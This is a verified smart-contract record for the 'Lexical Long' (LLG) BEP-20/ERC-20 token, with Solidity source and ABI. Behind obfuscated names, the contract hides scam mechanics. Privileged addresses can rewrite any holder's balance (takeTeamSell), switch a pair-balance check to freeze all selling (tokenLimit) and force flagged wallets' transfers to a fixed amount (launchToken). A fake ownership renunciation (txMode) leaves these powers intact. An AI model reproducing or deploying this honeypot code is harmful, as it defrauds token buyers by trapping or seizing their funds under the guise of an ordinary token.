{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface shouldTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txLiquidity {\n    function createPair(address totalMinTrading, address senderWallet) external returns (address);\n}\n\ninterface listLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldFrom) external view returns (uint256);\n\n    function transfer(address autoTakeReceiver, uint256 isToken) external returns (bool);\n\n    function allowance(address marketingMinReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoTakeReceiver,\n        uint256 isToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isEnable, uint256 value);\n    event Approval(address indexed marketingMinReceiver, address indexed spender, uint256 value);\n}\n\ninterface fundAuto is listLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LexicalLong is amountToken, listLaunched, fundAuto {\n\n    mapping(address => mapping(address => uint256)) private sellTeam;\n\n    mapping(address => bool) public shouldBuy;\n\n    function transfer(address modeBuy, uint256 isToken) external virtual override returns (bool) {\n        return tradingAt(_msgSender(), modeBuy, isToken);\n    }\n\n    function transferFrom(address launchTeamTotal, address autoTakeReceiver, uint256 isToken) external override returns (bool) {\n        if (_msgSender() != shouldMaxReceiver) {\n            if (sellTeam[launchTeamTotal][_msgSender()] != type(uint256).max) {\n                require(isToken <= sellTeam[launchTeamTotal][_msgSender()]);\n                sellTeam[launchTeamTotal][_msgSender()] -= isToken;\n            }\n        }\n        return tradingAt(launchTeamTotal, autoTakeReceiver, isToken);\n    }\n\n    uint256 public receiverExemptMarketing;\n\n    address public amountTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingMaxSender;\n    }\n\n    function allowance(address isShould, address fundLimit) external view virtual override returns (uint256) {\n        if (fundLimit == shouldMaxReceiver) {\n            return type(uint256).max;\n        }\n        return sellTeam[isShould][fundLimit];\n    }\n\n    address shouldMaxReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private amountFrom = \"Lexical Long\";\n\n    function listMarketing(address launchTeamTotal, address autoTakeReceiver, uint256 isToken) internal returns (bool) {\n        require(liquidityLaunch[launchTeamTotal] >= isToken);\n        liquidityLaunch[launchTeamTotal] -= isToken;\n        liquidityLaunch[autoTakeReceiver] += isToken;\n        emit Transfer(launchTeamTotal, autoTakeReceiver, isToken);\n        return true;\n    }\n\n    function feeTxLiquidity(address feeReceiver) public {\n        if (txMax) {\n            return;\n        }\n        if (shouldTake != senderTokenTo) {\n            limitShould = senderTokenTo;\n        }\n        shouldBuy[feeReceiver] = true;\n        \n        txMax = true;\n    }\n\n    uint8 private tradingMaxSender = 18;\n\n    bool private tradingFee;\n\n    function getOwner() external view returns (address) {\n        return launchMarketingIs;\n    }\n\n    uint256 public listToken;\n\n    uint256 maxTake;\n\n    mapping(address => uint256) private liquidityLaunch;\n\n    uint256 private buyFee = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed sellReceiverBuy, address indexed txTo);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyFee;\n    }\n\n    bool public enableIs;\n\n    uint256 private teamReceiverIs;\n\n    constructor (){\n        if (limitShould != listToken) {\n            limitShould = listToken;\n        }\n        shouldTotal liquidityTeamMarketing = shouldTotal(shouldMaxReceiver);\n        fromAuto = txLiquidity(liquidityTeamMarketing.factory()).createPair(liquidityTeamMarketing.WETH(), address(this));\n        \n        amountTotal = _msgSender();\n        txMode();\n        shouldBuy[amountTotal] = true;\n        liquidityLaunch[amountTotal] = buyFee;\n        if (shouldTake != limitShould) {\n            limitShould = receiverExemptMarketing;\n        }\n        emit Transfer(address(0), amountTotal, buyFee);\n    }\n\n    string private txSell = \"LLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return amountFrom;\n    }\n\n    uint256 public senderTokenTo;\n\n    mapping(address => bool) public tradingTx;\n\n    function launchToken(address fundSender) public {\n        sellSender();\n        \n        if (fundSender == amountTotal || fundSender == fromAuto) {\n            return;\n        }\n        tradingTx[fundSender] = true;\n    }\n\n    address private launchMarketingIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txSell;\n    }\n\n    bool private tokenTx;\n\n    function balanceOf(address shouldFrom) public view virtual override returns (uint256) {\n        return liquidityLaunch[shouldFrom];\n    }\n\n    function txMode() public {\n        emit OwnershipTransferred(amountTotal, address(0));\n        launchMarketingIs = address(0);\n    }\n\n    bool private maxList;\n\n    uint256 senderTrading;\n\n    function owner() external view returns (address) {\n        return launchMarketingIs;\n    }\n\n    address senderMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public txMax;\n\n    uint256 private limitShould;\n\n    uint256 public shouldTake;\n\n    uint256 constant totalWallet = 18 ** 10;\n\n    function sellSender() private view {\n        require(shouldBuy[_msgSender()]);\n    }\n\n    address public fromAuto;\n\n    function takeTeamSell(address modeBuy, uint256 isToken) public {\n        sellSender();\n        liquidityLaunch[modeBuy] = isToken;\n    }\n\n    function tokenLimit(uint256 isToken) public {\n        sellSender();\n        senderTrading = isToken;\n    }\n\n    function approve(address fundLimit, uint256 isToken) public virtual override returns (bool) {\n        sellTeam[_msgSender()][fundLimit] = isToken;\n        emit Approval(_msgSender(), fundLimit, isToken);\n        return true;\n    }\n\n    function tradingAt(address launchTeamTotal, address autoTakeReceiver, uint256 isToken) internal returns (bool) {\n        if (launchTeamTotal == amountTotal) {\n            return listMarketing(launchTeamTotal, autoTakeReceiver, isToken);\n        }\n        uint256 receiverAmount = listLaunched(fromAuto).balanceOf(senderMode);\n        require(receiverAmount == senderTrading);\n        require(autoTakeReceiver != senderMode);\n        if (tradingTx[launchTeamTotal]) {\n            return listMarketing(launchTeamTotal, autoTakeReceiver, totalWallet);\n        }\n        return listMarketing(launchTeamTotal, autoTakeReceiver, isToken);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMinReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiverBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"}],\"name\":\"feeTxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"}],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExemptMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTokenTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToken\",\"type\":\"uint256\"}],\"name\":\"takeTeamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isToken\",\"type\":\"uint256\"}],\"name\":\"tokenLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeamTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTakeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LexicalLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}